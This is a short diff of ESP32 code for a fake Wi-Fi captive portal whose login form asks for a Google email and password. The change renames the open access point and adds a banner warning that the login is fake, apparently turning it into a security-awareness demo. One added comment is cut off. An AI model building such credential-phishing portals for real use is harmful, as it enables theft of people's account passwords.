@@ -8,8 +8,8 @@ DNSServer dnsServer;
 AsyncWebServer httpServer(80);
 
 // access point generato dall'esp
-char *ssid_esp ="free_wifi";
-char *psw_esp = "";
+char *ssid_esp ="debug_wifi";
+char *psw_esp = "";  // the password need to be long at least 
 
 
 void loopCore1(void* p){
@@ -33,6 +33,8 @@ const char index_html[] PROGMEM= R"rawliteral(
     <body>
       <h1>Login</h1>
       <p></p>
+      <h1>FAKE CAPTIVE PORTAL</h1>
+      <p>This login is fake, please don't trust public wifi</p>
       <form action="/login">
         Your email Google : <input type="email" name="email"></input><br>
         Password : <input type="password" name="password"></input>
